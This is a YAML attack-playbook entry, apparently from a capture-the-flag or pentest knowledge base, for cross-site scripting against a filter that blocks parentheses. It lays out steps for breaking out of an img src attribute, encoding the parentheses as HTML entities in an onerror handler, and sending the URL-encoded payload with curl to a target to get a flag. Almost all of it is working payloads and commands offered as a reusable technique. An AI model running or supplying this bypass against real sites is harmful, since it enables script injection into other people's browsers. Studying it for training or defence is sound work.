name: xss_html_entity_parenthesis_bypass
category: web
tags: [xss, html_entity, parenthesis_bypass, filter_bypass]
indicators:
  - "Parentheses ( ) in blacklist"
  - "User input in HTML attribute value"
  - "img tag with controllable src"
  - "Character-based blacklist filtering"

tricks:
  - name: "Step 1: Identify blacklist"
    when: "Found XSS input point"
    how: "Analyze filter rules"
    payload: |
      # Blacklist: < > ( ) throw ` Â´ javascript
      # Input placed in: <img src="USER_INPUT">
      # Need to bypass parentheses for alert()

  - name: "Step 2: Use HTML entity encoding"
    when: "Parentheses blocked"
    how: "Encode ( and ) as HTML entities"
    payload: |
      # &#40; = (
      # &#41; = )
      # HTML entities are decoded in attribute values

  - name: "Step 3: Craft payload with onerror"
    when: "Can break out of src attribute"
    how: "Close src and add onerror event"
    payload: |
      x" onerror="alert&#40;'XSS'&#41;
      # Results in: <img src="x" onerror="alert('XSS')">
      # Invalid src triggers onerror, entities decoded to ()

  - name: "Step 4: Trigger XSS and get flag"
    when: "Execute attack"
    how: "Send payload via name parameter"
    payload: |
      curl "http://TARGET/page?name=x%22%20onerror=%22alert%26%2340%3B'XSS'%26%2341%3B"
      # Response: Congratulations! Here is the flag: flag{...}

  - name: "Alternative: Other HTML entities"
    when: "Need variations"
    how: "Try different entity formats"
    payload: |
      # Decimal: &#40; &#41;
      # Hex: &#x28; &#x29;
      # Named entities may also work in some contexts
